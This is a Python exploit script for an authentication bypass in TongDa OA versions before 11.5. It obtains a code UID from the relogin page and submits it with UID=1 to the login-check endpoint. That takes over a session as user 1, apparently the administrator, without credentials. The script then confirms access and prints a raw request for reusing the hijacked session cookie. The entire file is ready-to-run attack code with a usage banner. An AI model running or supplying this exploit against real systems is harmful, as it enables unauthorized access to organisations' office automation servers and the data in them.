#!/usr/bin/python
#auther by S0cke3t
#2020-8-24

import requests
import sys
import os
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate",
    "DNT": "1",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "close"
}

#proxies = {"http":"http://127.0.0.1:8080"}

def GetUid(Target):
    uri = "/general/relogin.php"
    resp = requests.get(Target + uri, verify=False, headers=headers)
    uid = (re.search('{(.*?)}', resp.text)).group(1)
    return uid
def GetCookie(Target,uid):
    cookies = {}
    uri = "/logincheck_code.php"
    resp = requests.post(Target + uri, data="CODEUID={" + uid + "}&UID=1",verify=False, headers=headers)
    cks = resp.headers['Set-Cookie']
    name,value = (cks.split(';')[0]).split('=',1)
    cookies[name] = value
    return cookies
def Exploit(Target):
    Uid = GetUid(Target)
    print("[+]Generate Uid: " + Uid)
    Session = GetCookie(Target,Uid)
    print("[+]Generate Sessionid: " + Session['PHPSESSID'])
    resp = requests.get(Target + "/general/index.php", cookies = Session, verify=False, headers=headers)
    if "warning.png" in resp.text:
        print("Login failed , please check again !")
        exit()
    template = '''
GET /general/index.php HTTP/1.1
Host: {0}
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID={1}
Connection: close
'''
    print("[*]Login successful ! \n[+]Raw: " + template.format(Target.split('//')[1],Session['PHPSESSID']))


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("========== TongDa OA < 11.5 Auth Bypass ==========\r\n")
        print("usage: "+str(sys.argv[0][sys.argv[0].rfind(os.sep) + 1:])+"  http[s]://x.x.x.x\r\n")
        print("========== Auther By S0cke3t ==========")
        exit()
    Exploit(sys.argv[1])